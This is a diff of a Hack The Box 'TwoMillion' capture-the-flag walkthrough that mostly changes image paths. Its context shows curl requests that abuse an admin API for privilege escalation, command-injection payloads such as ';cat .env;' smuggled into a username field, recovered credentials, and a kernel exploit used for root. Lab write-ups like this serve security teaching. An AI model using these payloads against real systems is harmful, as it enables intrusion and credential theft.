@@ -7,7 +7,7 @@ Before starting any attack, it is essential to perform a **reconnaissance** phas
 nmap -p- --open -Pn -n -T5 -sSVC -vvv <IP>
 ````
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw7.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw7.png" style="max-width:100%; border-radius:8px;">
 
 We obtain **two open ports** on the target machine. When analyzing **port 80 (HTTP)**, we observe that it is associated with a **custom domain name**. To access this site correctly from our browser, we must add the domain to our `/etc/hosts` file.
 
@@ -25,9 +25,9 @@ When accessing the website through **port 80**, we are presented with an old ver
 
 By reviewing the **page source code**, we find a direct reference to this directory, suggesting that it may be a useful entry point to continue exploitation or obtain an invitation.
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw1.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw1.png" style="max-width:100%; border-radius:8px;">
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw8.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw8.png" style="max-width:100%; border-radius:8px;">
 
 Once inside the **`/invite`** directory, the site requests an **invitation code** to proceed. However, when inspecting the elements using the browser’s developer tools (for example, pressing F12), we notice something interesting:
 
@@ -37,7 +37,7 @@ When reloading the page, a JavaScript file is loaded called:
 inviteapi.min.js
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw2.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw2.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -115,7 +115,7 @@ Steps performed:
 3. Apply the **ROT13** operation.
 4. Obtain the decoded message in plain text, which provides instructions for the next step.
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw3.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw3.png" style="max-width:100%; border-radius:8px;">
 
 The decoded message indicates that, to generate the invitation code, we must send a **POST** request to the following endpoint:
 
@@ -155,9 +155,9 @@ Once we have the invitation code, we are redirected to the registration page. We
 
 After registering successfully, we gain full access to the Hack The Box platform and can continue with exploration and pentesting.
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw4.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw4.png" style="max-width:100%; border-radius:8px;">
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw9.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw9.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -165,11 +165,11 @@ After registering successfully, we gain full access to the Hack The Box platform
 
 While reviewing the page source code, we once again find a route pointing to an API:
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw5.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw5.png" style="max-width:100%; border-radius:8px;">
 
 We proceed to send a request to the API using Burp Suite:
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw10.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw10.png" style="max-width:100%; border-radius:8px;">
 
 In the analyzed request, we observe several routes referencing **Admin**. This draws our attention, as they may be related to administrative functionality. We manually review each of these routes to see if any are exposed or allow access without special authentication. This may help us identify weak points or hidden functionality in the application.
 
@@ -177,7 +177,7 @@ In the analyzed request, we observe several routes referencing **Admin**. This d
 curl "http://2million.htb/api/v1/admin/settings/update" -X PUT --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json"
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw11.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw11.png" style="max-width:100%; border-radius:8px;">
 
 Once we correctly add the `Content-Type` header to the request, we see that the response returns a parameter called `email`. This indicates that the API is processing the submitted data and is likely expecting an email-related value.
 
@@ -187,7 +187,7 @@ We send the request again:
 curl "http://2million.htb/api/v1/admin/settings/update" -X PUT --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data '{"email": "prueba@prueba.com", "admin": "1" }'
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw6.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw6.png" style="max-width:100%; border-radius:8px;">
 
 We add the `is_admin` parameter to the request:
 
@@ -199,7 +199,7 @@ curl "http://2million.htb/api/v1/admin/settings/update" -X PUT --header "Cookie:
 {"id":18,"username":"buda","is_admin":1}
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw12.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw12.png" style="max-width:100%; border-radius:8px;">
 
 Next, we inspect the route related to the VPN functionality. We confirm that a configuration file is generated. However, by modifying the `username` parameter and setting its value to `";ls;"`, we discover that it is possible to execute arbitrary commands on the server.
 
@@ -209,7 +209,7 @@ This confirms the presence of a **command injection vulnerability**, allowing us
 curl "http://2million.htb/api/v1/admin/vpn/generate" -X POST --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data "{\"username\":\";ls;\"}"
 ```
 
-![[tw13.png]]
+<img src="/budahacksecurity/uploads/md_images/two/tw13.png" style="max-width:100%; border-radius:8px;">
 
 Now that we can execute arbitrary commands on the server, we leverage this capability to inspect the `database.php` file, aiming to locate database credentials or other sensitive information that may help us progress further.
 
@@ -286,7 +286,7 @@ Since we do not find credentials directly in the `database.php` file, we decide 
 curl "http://2million.htb/api/v1/admin/vpn/generate" -X POST --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data "{\"username\":\";ls -la;\"}"  
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw14.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw14.png" style="max-width:100%; border-radius:8px;">
 
 We open the hidden `.env` file and confirm that it contains the username and password. Using these credentials, we log in via SSH to the machine and successfully obtain the first flag.
 
@@ -294,14 +294,14 @@ We open the hidden `.env` file and confirm that it contains the username and pas
 curl "http://2million.htb/api/v1/admin/vpn/generate" -X POST --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data "{\"username\":\";cat .env;\"}" 
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw15.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw15.png" style="max-width:100%; border-radius:8px;">
 
 ```ruby
 user = admin
 pass = SuperDuperPass123
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw16.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw16.png" style="max-width:100%; border-radius:8px;">
 
 After enumerating the system, we find an email from the administrator mentioning a Linux kernel vulnerability called **OverlayFS / FUSE**. We research it further and find the following exploit reference:
 
@@ -322,7 +322,7 @@ In the **second terminal**, run:
 ./exp
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/two/tw17.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/two/tw17.png" style="max-width:100%; border-radius:8px;">
 
 If the exploit executes successfully, we obtain **root access**.
 
